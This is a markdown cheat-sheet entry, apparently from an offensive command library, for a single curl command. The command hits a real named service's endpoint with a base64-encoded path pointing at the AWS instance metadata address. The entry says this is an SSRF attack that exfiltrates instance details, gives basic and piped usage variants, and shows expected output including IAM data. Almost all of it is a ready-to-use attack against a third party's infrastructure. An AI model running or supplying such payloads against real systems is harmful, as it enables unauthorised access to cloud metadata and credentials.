---
data: >-
  curl
  "https://www.evernote.com/ro/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8jLmpz/-1430533899.js"
tags:
  - ssrf
  - curl
  - aws
type: command
output: null
executor: bash
platforms:
  - Web
  - AWS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:29.992Z'
id: 702b2d5f-bdce-4ba5-bf52-dd1954254a9a
verified: false
validated: true
submitted: true
---
# curl-ssrf-aws-metadata

## Command

```bash
curl "https://www.evernote.com/ro/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8jLmpz/-1430533899.js"
```

## Description

Triggers SSRF to access AWS metadata service via the vulnerable endpoint, exfiltrating instance details.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Encoded SSRF endpoint | Yes |

## Examples

### Basic Usage

```bash
curl "https://www.evernote.com/ro/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8jLmpz/-1430533899.js"
```

### Advanced Usage

```bash
curl -s "https://www.evernote.com/ro/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8jLmpz/-1430533899.js" | jq
```

## Expected Output

AWS metadata JSON, e.g., {"Code" : "Success", "iam" : {...}}.

## Related

- [[Related Procedure]]
